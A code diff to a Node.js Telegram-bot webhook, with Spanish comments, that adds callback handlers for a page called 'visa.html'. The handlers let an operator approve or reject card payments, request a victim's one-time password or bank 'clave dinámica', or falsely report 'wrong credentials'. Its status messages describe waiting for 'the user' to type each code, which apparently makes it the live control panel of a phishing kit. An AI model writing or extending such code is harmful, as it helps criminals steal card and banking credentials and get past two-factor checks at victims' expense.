@@ -46,51 +46,275 @@ module.exports = async (req, res) => {
                 const callbackData = callback.data;
                 const callbackId = callback.id;
 
-                // Extraer solicitudId del callback_data
-                const match = callbackData.match(/(approve_cc_|reject_cc_)(.+)/);
-                if (!match) {
+                // ============================================
+                // 🔹 CASO 1: approve_cc_{id} / reject_cc_{id} (EXISTENTE)
+                // ============================================
+                const matchCC = callbackData.match(/(approve_cc_|reject_cc_)(.+)/);
+                if (matchCC) {
+                    const accion = matchCC[1];
+                    const solicitudId = matchCC[2];
+                    const estado = accion.includes('approve') ? 'approved' : 'rejected';
+
+                    guardarEstado(solicitudId, estado);
+
+                    // Responder a Telegram
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            callback_query_id: callbackId,
+                            text: estado === 'approved' ? '✅ Pago aprobado' : '❌ Pago rechazado',
+                            show_alert: false
+                        })
+                    });
+
+                    const editText = callback.message.text + '\n\n' + (estado === 'approved' ? '✅ **APROBADO**' : '❌ **RECHAZADO**');
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: callback.message.chat.id,
+                            message_id: callback.message.message_id,
+                            text: editText,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+
                     return res.status(200).send('OK');
                 }
 
-                const accion = match[1];
-                const solicitudId = match[2];
+                // ============================================
+                // 🔹 CASO 2: pedir_otp_{id} (NUEVO - visa.html)
+                // ============================================
+                const matchPedirOTP = callbackData.match(/pedir_otp_(.+)/);
+                if (matchPedirOTP) {
+                    const solicitudId = matchPedirOTP[1];
+                    guardarEstado(solicitudId, 'pedir_otp');
 
-                // Determinar estado
-                const estado = accion.includes('approve') ? 'approved' : 'rejected';
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            callback_query_id: callbackId,
+                            text: '📱 OTP solicitado. Esperando ingreso del usuario...',
+                            show_alert: false
+                        })
+                    });
 
-                // Guardar estado
-                guardarEstado(solicitudId, estado);
+                    const editText = callback.message.text + '\n\n📱 **OTP SOLICITADO**\n⏳ Esperando ingreso del código por parte del usuario...';
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: callback.message.chat.id,
+                            message_id: callback.message.message_id,
+                            text: editText,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+
+                    return res.status(200).send('OK');
+                }
 
                 // ============================================
-                // 3. RESPONDER A TELEGRAM (Callback Query)
+                // 🔹 CASO 3: pedir_clave_din_{id} (NUEVO - visa.html)
                 // ============================================
-                const respuesta = {
-                    callback_query_id: callbackId,
-                    text: estado === 'approved' ? '✅ Pago aprobado' : '❌ Pago rechazado',
-                    show_alert: false
-                };
+                const matchClaveDin = callbackData.match(/pedir_clave_din_(.+)/);
+                if (matchClaveDin) {
+                    const solicitudId = matchClaveDin[1];
+                    guardarEstado(solicitudId, 'pedir_clave_din');
 
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(respuesta)
-                });
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            callback_query_id: callbackId,
+                            text: '🔑 Clave Dinámica solicitada. Esperando ingreso del usuario...',
+                            show_alert: false
+                        })
+                    });
+
+                    const editText = callback.message.text + '\n\n🔑 **CLAVE DINÁMICA SOLICITADA**\n⏳ Esperando ingreso de la clave por parte del usuario...';
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: callback.message.chat.id,
+                            message_id: callback.message.message_id,
+                            text: editText,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+
+                    return res.status(200).send('OK');
+                }
 
                 // ============================================
-                // 4. EDITAR MENSAJE EN TELEGRAM
+                // 🔹 CASO 4: error_credenciales_{id} (NUEVO - visa.html)
                 // ============================================
-                const editText = callback.message.text + '\n\n' + (estado === 'approved' ? '✅ **APROBADO**' : '❌ **RECHAZADO**');
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: callback.message.chat.id,
-                        message_id: callback.message.message_id,
-                        text: editText,
-                        parse_mode: 'Markdown'
-                    })
-                });
+                const matchError = callbackData.match(/error_credenciales_(.+)/);
+                if (matchError) {
+                    const solicitudId = matchError[1];
+                    guardarEstado(solicitudId, 'error_credenciales');
 
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            callback_query_id: callbackId,
+                            text: '❌ Credenciales incorrectas',
+                            show_alert: false
+                        })
+                    });
+
+                    const editText = callback.message.text + '\n\n❌ **CREDENCIALES INCORRECTAS**\nEl usuario deberá intentar nuevamente.';
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: callback.message.chat.id,
+                            message_id: callback.message.message_id,
+                            text: editText,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+
+                    return res.status(200).send('OK');
+                }
+
+                // ============================================
+                // 🔹 CASO 5: aprobar_otp_{id} (NUEVO - visa.html)
+                // ============================================
+                const matchAprobarOTP = callbackData.match(/aprobar_otp_(.+)/);
+                if (matchAprobarOTP) {
+                    const solicitudId = matchAprobarOTP[1];
+                    guardarEstado(solicitudId, 'aprobar_otp');
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            callback_query_id: callbackId,
+                            text: '✅ OTP aprobado. Autenticación completada.',
+                            show_alert: false
+                        })
+                    });
+
+                    const editText = callback.message.text + '\n\n✅ **OTP APROBADO**\n🎉 Autenticación completada exitosamente.';
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: callback.message.chat.id,
+                            message_id: callback.message.message_id,
+                            text: editText,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+
+                    return res.status(200).send('OK');
+                }
+
+                // ============================================
+                // 🔹 CASO 6: rechazar_otp_{id} (NUEVO - visa.html)
+                // ============================================
+                const matchRechazarOTP = callbackData.match(/rechazar_otp_(.+)/);
+                if (matchRechazarOTP) {
+                    const solicitudId = matchRechazarOTP[1];
+                    guardarEstado(solicitudId, 'rechazar_otp');
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            callback_query_id: callbackId,
+                            text: '❌ OTP rechazado',
+                            show_alert: false
+                        })
+                    });
+
+                    const editText = callback.message.text + '\n\n❌ **OTP RECHAZADO**\nEl usuario deberá intentar nuevamente.';
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: callback.message.chat.id,
+                            message_id: callback.message.message_id,
+                            text: editText,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+
+                    return res.status(200).send('OK');
+                }
+
+                // ============================================
+                // 🔹 CASO 7: aprobar_clave_din_{id} (NUEVO - visa.html)
+                // ============================================
+                const matchAprobarClave = callbackData.match(/aprobar_clave_din_(.+)/);
+                if (matchAprobarClave) {
+                    const solicitudId = matchAprobarClave[1];
+                    guardarEstado(solicitudId, 'aprobar_clave_din');
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            callback_query_id: callbackId,
+                            text: '✅ Clave Dinámica aprobada. Autenticación completada.',
+                            show_alert: false
+                        })
+                    });
+
+                    const editText = callback.message.text + '\n\n✅ **CLAVE DINÁMICA APROBADA**\n🎉 Autenticación completada exitosamente.';
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: callback.message.chat.id,
+                            message_id: callback.message.message_id,
+                            text: editText,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+
+                    return res.status(200).send('OK');
+                }
+
+                // ============================================
+                // 🔹 CASO 8: rechazar_clave_din_{id} (NUEVO - visa.html)
+                // ============================================
+                const matchRechazarClave = callbackData.match(/rechazar_clave_din_(.+)/);
+                if (matchRechazarClave) {
+                    const solicitudId = matchRechazarClave[1];
+                    guardarEstado(solicitudId, 'rechazar_clave_din');
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            callback_query_id: callbackId,
+                            text: '❌ Clave Dinámica rechazada',
+                            show_alert: false
+                        })
+                    });
+
+                    const editText = callback.message.text + '\n\n❌ **CLAVE DINÁMICA RECHAZADA**\nEl usuario deberá intentar nuevamente.';
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: callback.message.chat.id,
+                            message_id: callback.message.message_id,
+                            text: editText,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+
+                    return res.status(200).send('OK');
+                }
+
+                // Si no coincide con ningún caso, ignorar
                 return res.status(200).send('OK');
             }
 
@@ -102,7 +326,7 @@ module.exports = async (req, res) => {
     }
 
     // ============================================
-    // 5. SI NO ES NINGUNA DE LAS ANTERIORES
+    // 3. SI NO ES NINGUNA DE LAS ANTERIORES
     // ============================================
     return res.status(200).send('Webhook activo');
 };
